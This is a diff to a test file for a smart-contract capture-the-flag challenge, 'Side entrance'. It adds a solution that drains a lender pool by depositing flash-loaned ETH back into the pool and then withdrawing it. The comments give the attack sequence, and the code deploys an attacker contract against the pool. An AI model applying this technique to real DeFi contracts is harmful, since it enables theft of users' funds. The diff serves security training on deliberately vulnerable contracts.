@@ -25,6 +25,13 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // goal : drain eth in lender pool
+        // only check after balance >= before balance
+        // flashloan -> deposit (so balance equal, but can withdraw all later) -> payback -> withdraw
+        const attackerFactory = await ethers.getContractFactory('SideEntranceLenderPoolAttacker', attacker);
+        this.attackContract = await attackerFactory.deploy();
+        this.attackContract.connect(attacker).attack(this.pool.address);
     });
 
     after(async function () {
